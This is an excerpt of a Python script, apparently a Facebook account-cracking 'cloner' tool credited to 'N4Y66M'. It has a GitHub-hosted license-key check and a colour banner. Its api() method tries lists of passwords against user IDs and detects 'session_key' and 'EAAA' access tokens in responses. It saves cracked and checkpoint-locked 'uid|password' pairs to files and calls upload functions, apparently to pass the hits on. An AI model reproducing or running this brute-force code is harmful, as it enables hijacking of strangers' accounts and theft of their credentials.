...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/N4Y66M/aproval.txt/blob/main/approval.txt"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/N4Y66M/Dark_king/blob/main/Nayeem.txt:').text
			if basesplit in plr:
				key = basesplit
...
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : Nayeem Hassan \033[1;32m[N4Y66M]         │
\033[1;34m│ [✓] GITHUB   :  \033[41m\033[1;37mhttp://github.com/N4Y66M\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :         │
\033[1;36m│ [✓] POWER  : \x1b[1;32mN4Y66M\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
""")
		print("%s [%s•%s] %sTOOL NAME : %sN4Y66M❌ PROO CLONER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [N4Y66M-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[N4Y66M-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [N4Y66M-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
